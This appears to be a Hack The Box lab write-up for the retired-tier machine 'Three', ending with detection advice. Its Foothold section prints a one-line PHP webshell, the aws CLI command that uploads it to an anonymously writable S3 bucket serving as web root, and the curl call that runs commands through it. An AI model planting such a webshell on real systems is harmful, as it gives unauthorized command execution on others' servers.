# Three — Hack The Box

> Starting Point, Tier 1. Linux.

## Summary

A static site that gives up nothing on the main host, because the application is
not there. The target is a virtual host whose name is short enough that
directory brute forcing never sees it, and that host turns out to be an S3
bucket with anonymous write access sitting in front of the web root. Uploading a
PHP shell into the bucket is the entire foothold, and the flag is readable by
the web user. No privilege escalation, no CVE. Two things that look unrelated
until they are not: hostname enumeration, and storage permissions treated as a
web server.

## Enumeration

```
nmap -p- --min-rate 3000 -T4 -oN allports.txt 10.129.x.x
nmap -sCV -p22,80 -oN services.txt 10.129.x.x
```

Two ports: SSH (OpenSSH 7.6p1) and HTTP (Apache 2.4.29, title "The Toppers").
Nothing else was listening, so the box had to be solved through the web server.

The site itself is static, and I wasted the first pass on directories before
accepting that. What worked was virtual-host enumeration:

```
gobuster vhost -u http://10.129.x.x --domain thetoppers.htb \
  --append-domain -w subdomains-top5000.txt
```

That returned `s3.thetoppers.htb`. The hostname is the hint: the service name is
the subdomain, so this is storage, not a website.

`s3` is a three-character entry, and I had assumed wordlists skip names that
short. `subdomains-top5000.txt` contains it, so I checked rather than guessed and
saved myself a second pass with a larger list. With the hostnames in
`/etc/hosts`, the endpoint answered on its own.

## Dead ends

Directory brute forcing. `gobuster dir` with `common.txt` and `php,txt,bak,zip`
extensions returned nothing, because a static page has no directories to find.
The application was one layer up, in the hostname.

The second false negative was my own upload. A `PUT` returned `200`, but
requesting the file from the web root gave `404` for a few seconds. The object
appears in the document root after a short sync. If I had stopped at the first
`404` I would have concluded the bucket was read-only when it was wide open.

## Foothold

The S3 endpoint lists the bucket without credentials:

```
aws --endpoint-url http://s3.thetoppers.htb s3 ls
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

The bucket is named `thetoppers.htb` and holds `.htaccess`, `index.php` and the
site's images. It is also the document root, so anything written there is served
by Apache.

The same anonymous access allows a write:

```
aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
```

where `shell.php` is one line:

```php
<?php system($_GET["cmd"]); ?>
```

Then:

```
curl "http://thetoppers.htb/shell.php?cmd=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

No credentials, no bucket policy, no exploit. The storage bucket accepted an
unauthenticated `PUT` from anyone who knew the hostname, and the web server
executed what landed in it.

## Privilege escalation

None needed. The flag is at `/var/www/flag.txt`, owned `root:www-data` with group
read, so `www-data` can read it directly through the same shell.

That is the honest ending: this box is not about escalation. The chain stops at
the misconfiguration, and the interesting question is why a bucket accepted
writes from an unauthenticated client at all.

## What I would do differently

- Enumerate virtual hosts before directories. On a static site it is the only
  enumeration that can produce a result.
- Check bucket write permissions deliberately, with a harmless object, instead
  of discovering them by uploading something I wanted to keep.
- Give an upload a minute before calling it a failure. Cache and sync delays
  look exactly like permission errors from the outside.

## Detections

- A bucket with no policy at all, allowing anonymous `PutObject`, is a
  reviewable configuration error. Cloud security posture tooling flags public
  write as critical by default, and it should never reach production.
- `PutObject` from an address the application never uses is a clean signal.
  CloudTrail data events are off by default, which is why this stays quiet.
- A new `.php` file in a directory that should only hold static assets should
  trip a file-integrity monitor. The webshell request itself (`shell.php?cmd=`)
  is a trivial signature once logging exists.

---

### Publishing checklist

- [x] Machine is retired or Starting Point
- [x] No flags, hashes, or cracked credentials
- [x] No target IPs included
- [x] Written in my own words
